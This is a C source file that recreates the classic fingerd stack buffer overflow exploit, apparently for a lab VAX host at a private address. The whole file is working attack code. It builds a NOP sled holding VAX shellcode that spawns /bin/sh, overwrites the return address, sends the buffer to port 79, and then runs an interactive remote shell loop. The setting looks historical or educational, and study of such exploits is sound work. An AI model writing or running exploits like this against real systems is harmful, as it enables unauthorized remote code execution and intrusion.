#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#define TARGET_IP "172.20.0.10"
#define FINGERD_IP 79

#define BUF_SIZE 512 + 16 + 4 // finger buffer size + four 4 byte words + 4byte address
#define PAYLOAD "\335\217/sh\0\335\217/bin\320^Z\335\0\335\0\335Z\335\003\320^\\\274;\344\371\344\342\241\256\343\350\357\256\362\351"
#define PAYLOAD_LEN 28
#define NOP 0x01	// VAX nop instruction

void create_exploit(char *buf, char *shellcode, ssize_t buf_size, ssize_t shellcode_len) {
	int i, j;
	int extra_words = 4 * 4;
	int address_size = 4;
    for (i = 0; i < buf_size; i++) buf[i] = NOP;  
    for (j = 0; j < shellcode_len; j++) buf[300+j] = shellcode[j]; 

	// from rapid7 article
	for (i = buf_size - extra_words - address_size; i < buf_size - address_size; i ++) { 
		buf[i] = 0x00; 
	}
	// some place within the buffer
    for (i = buf_size - address_size; i < buf_size; i += 4) {
        buf[i]   = 0x38; 
        buf[i+1] = 0xea;
        buf[i+2] = 0xff;
        buf[i+3] = 0x7f;
    }
}	

int main() {
    int sock = 0;
    struct sockaddr_in serv_addr;

    char buf[532] = {0};

	create_exploit(buf, PAYLOAD, (ssize_t)BUF_SIZE, (ssize_t)PAYLOAD_LEN);

	//create socket
	sock = socket(AF_INET, SOCK_STREAM, 0);

	// target network address info
	serv_addr.sin_family = AF_INET; 		
	serv_addr.sin_port = htons(FINGERD_IP);
	inet_pton(AF_INET, TARGET_IP, &serv_addr.sin_addr);

	// connect to fingerd
	connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

	// deliever payload; fingerd should now be a shell
	write(sock, buf, sizeof(buf));
    printf("Payload delivered! Switching to interactive mode...\n");

    fd_set fds;
    char io_buf[1024];
    int n;

    while (1) {
        FD_ZERO(&fds);
        FD_SET(0, &fds);    // Watch stdin (your keyboard)
        FD_SET(sock, &fds); // Watch the socket (the VAX shell)

        // select() blocks until there is something to read from either source
		// select is destructive; it modifies the fds, removing all but one fd that is ready
		// to read; so you have to generate new fd_set every loop
        if (select(sock + 1, &fds, NULL, NULL, NULL) < 0) {
            perror("select");
            break;
        }

        // Check if the VAX sent us output (Shell results)
        if (FD_ISSET(sock, &fds)) {
            n = read(sock, io_buf, sizeof(io_buf));
            if (n <= 0) {
                printf("\n[-] Connection closed.\n");
                break;
            }
            write(1, io_buf, n); // Print results to your screen
        }

        // Check if you typed a command to send to the VAX
        if (FD_ISSET(0, &fds)) {
            n = read(0, io_buf, sizeof(io_buf));
            if (n > 0) {
                write(sock, io_buf, n); // Send command to /bin/sh
            }
        }
    }

	close(sock);

    return 0;
}
